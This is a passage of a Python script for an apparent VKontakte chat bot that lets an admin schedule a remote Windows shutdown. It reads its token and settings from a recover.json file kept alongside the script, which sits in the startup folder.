                                                        
                                                        else:
                                                            vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="Компьютер будет успешно выключен:)")
                                                            os.system(f'shutdown -s -t {eventik}')
                                                            break

                                            elif eventik<36000 and eventik>0:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="Компьютер успешно выключен:)")
                                                os.system(f'shutdown -s -t {eventik}')
                                                break

                                            else:
                                                vk.messages.send(peer_id=profile_id,random_id=get_random_id(),keyboard=keyboard.get_keyboard(),message="что-то пошло не так")    
                                                break

                                            break
                        except Exception:
                            error_msg(profile_id)
                            
            except ConnectionError:
                print("errr")
                
                
#main code


def main_control():
    import requests
    time_codes=0
    loop_status=True
    while loop_status==True:
        if time_codes>=15:
            sys.exit("time connection error")
            break
        
        try:
            response = requests.get("http://www.google.com")
            time.sleep(5)
            
        except requests.ConnectionError:
            time.sleep(5)
            time_codes+=1
            print("no_connection")

        else:
            loop_status=False#надо
            USER_NAME = getpass.getuser()
            redirect="recover.json"
            file_path=os.path.dirname(os.path.realpath(__main__.__file__))#link to startup
            json_path=f"{file_path}\{redirect}"#link to .json file
            
            try:
                with open(json_path) as file:#путь до автозагрузки
                    not_stat=json.load(file)['notification_status']
                
                with open(json_path) as file:#путь до автозагрузки
                    token=json.load(file)['token']

                with open(json_path) as file:#путь до автозагрузки
                    id_admin=json.load(file)['id_admin']

                with open(json_path) as file:#путь до автозагрузки
                    turn_on=json.load(file)['turn_on']
                    
                if not_stat == True:
                    print("notify on")
                    a = threading.Thread(target=main, args=(token,id_admin,turn_on,))
                    a.start()
                else:
                    print("notify off")
                    b = threading.Thread(target=secondary_main, args=(token,id_admin,turn_on,))
                    b.start()

            except FileNotFoundError:
                print("неаеанno such file in startup")

                
    


main_control()
    
    
